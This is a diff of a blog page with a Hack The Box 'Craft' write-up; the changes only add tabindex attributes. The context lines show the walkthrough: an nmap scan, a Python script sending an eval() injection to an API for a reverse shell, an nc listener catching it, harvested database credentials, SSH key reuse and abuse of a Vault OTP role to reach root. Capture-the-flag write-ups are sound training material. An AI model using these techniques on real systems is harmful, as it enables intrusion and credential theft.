@@ -103,7 +103,7 @@ Today was just retired Craft from Hack the box, this was a really fun box to do,
 <p>Said that, let&rsquo;s start with the real write up!</p>
 <h2 id=nmap>Nmap</h2>
 <p>We start running nmap to scan for open ports and services:</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
 Nmap scan report for 10.10.10.110
 Host is up (0.082s latency).
@@ -170,7 +170,7 @@ Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
 <h2 id=rce>RCE</h2>
 <p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
 I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 import requests
@@ -189,8 +189,8 @@ payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, 
 payload = json.dumps(payload)
 attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
 </code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
-</code></pre><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
+</code></pre><pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
 /bin/sh: can't access tty; job control turned off
@@ -199,7 +199,7 @@ root
 /opt/app # id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 </code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
-<pre><code class=language-console data-lang=console>/opt/app # cd /root
+<pre tabindex=0><code class=language-console data-lang=console>/opt/app # cd /root
 /root # ls -la
 total 12
 drwx------    1 root     root          4096 Feb  9  2019 .
@@ -207,7 +207,7 @@ drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
 drwx------    1 root     root          4096 Feb  9  2019 .cache
 /root # 
 </code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
-<pre><code class=language-console data-lang=console>/opt/app # ls -la /
+<pre tabindex=0><code class=language-console data-lang=console>/opt/app # ls -la /
 total 64
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
@@ -263,7 +263,7 @@ lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
 </code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
-<pre><code class=language-console data-lang=console>/opt/app # ls -la
+<pre tabindex=0><code class=language-console data-lang=console>/opt/app # ls -la
 total 32
 drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
@@ -285,7 +285,7 @@ craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
 dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
 /opt/app # 
 </code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
-<pre><code class=language-console data-lang=console>/opt/app # cat dbtest.py
+<pre tabindex=0><code class=language-console data-lang=console>/opt/app # cat dbtest.py
 #!/usr/bin/env python
 
 import pymysql
@@ -312,10 +312,10 @@ finally:
 </code></pre><p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>
 <img src=https://ceso.github.io/images/htb/craft/1-rce.png class=center style=border-radius:8px>
 So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
-<pre><code class=language-console data-lang=console>/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
+<pre tabindex=0><code class=language-console data-lang=console>/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
 /opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
 </code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
-<pre><code class=language-console data-lang=console>/opt/app # python dbtest.py
+<pre tabindex=0><code class=language-console data-lang=console>/opt/app # python dbtest.py
 [{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
 /opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
 /opt/app # python dbtest.py
@@ -327,7 +327,7 @@ So, I change the script to do a <code>show tables</code> using <code>fetchall()<
 <p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p>
 <img src=https://ceso.github.io/images/htb/craft/3-gil.png class=center style=border-radius:8px>
 <p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
 
 
   .   *   ..  . *  *
@@ -362,7 +362,7 @@ gilfoyle@craft:~$ wc -c user.txt
 33 user.txt
 </code></pre><h2 id=root>root</h2>
 <p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href=https://www.vaultproject.io/>Vault project page</a>), and try to login to vault with it which goes well.</p>
-<pre><code class=language-console data-lang=console>gilfoyle@craft:~$ cat .vault-token 
+<pre tabindex=0><code class=language-console data-lang=console>gilfoyle@craft:~$ cat .vault-token 
 f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
 Token (will be hidden): 
 Success! You are now authenticated. The token information displayed below
@@ -382,7 +382,7 @@ gilfoyle@craft:~$
 </code></pre><p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:
 <img src=https://ceso.github.io/images/htb/craft/4-gil.png class=center style=border-radius:8px>
 with this information we run vault to get the kv if the secret is indeed there:</p>
-<pre><code class=language-console data-lang=console>gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
+<pre tabindex=0><code class=language-console data-lang=console>gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
 ========== Data ==========
 Key                  Value
 ---                  -----
@@ -394,7 +394,7 @@ key_type             otp
 port                 22
 </code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href=https://en.wikipedia.org/wiki/One-time_password>One-Time Password</a>)
 We check what options vault provides to use it:</p>
-<pre><code class=language-console data-lang=console>gilfoyle@craft:~$ vault
+<pre tabindex=0><code class=language-console data-lang=console>gilfoyle@craft:~$ vault
 Usage: vault &lt;command&gt; [args]
 
 Common commands:
@@ -449,7 +449,7 @@ Usage: vault ssh [options] username@ip [ssh options]
 
   For the full list of options and arguments, please see the documentation.
 </code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
-<pre><code class=language-console data-lang=console>gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
+<pre tabindex=0><code class=language-console data-lang=console>gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
 Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
 below. Enter this code in the SSH password prompt. If you install sshpass,
 Vault can automatically perform this step for you.
